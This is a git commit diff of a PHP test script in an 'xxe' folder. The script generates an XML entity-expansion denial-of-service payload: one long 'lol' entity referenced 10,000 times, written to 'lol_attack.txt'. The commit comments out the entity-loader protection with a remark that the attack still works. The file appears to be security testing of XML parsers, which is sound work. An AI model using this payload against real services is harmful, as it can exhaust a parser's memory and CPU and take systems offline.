1bd80bb547b5e26ba701f88d28eefbae9be1109f
root <root@localhost.localdomain>
2017-06-27 11:07:29 +0900

    refine lol test code

--- xxe/lol_test.php
+++ xxe/lol_test.php
@@ -2,7 +2,7 @@
 
 $s0 = <<<XML
 	<!DOCTYPE test
-	[<!ENTITY lol "lollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollol">]>
+	[<!ENTITY a "lollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollol">]>
 	<test><testing>
 	foo
 	</testing></test>
@@ -13,18 +13,22 @@ $until = 10000;
 $acc = "";
 
 for($i=0; $i < $until; $i++){
-	$acc = $acc. "&lol;";
+	$acc = $acc. "&a;";
 }
 $xml = str_replace("foo", $acc, $s0);
 
+$myfile = fopen("lol_attack.txt","w");
+fwrite($myfile, $xml);
+fclose($myfile);
 
-// entity loading disabled
-libxml_disable_entity_loader(true);
 
+// entity loading disabled : but still work!
+//libxml_disable_entity_loader(true);
+/*
 $dom = new DOMDocument();
 $dom->loadXML($xml);
 $doc = simplexml_import_dom($dom);
 echo $doc->testing;
-
+*/
 
 ?>
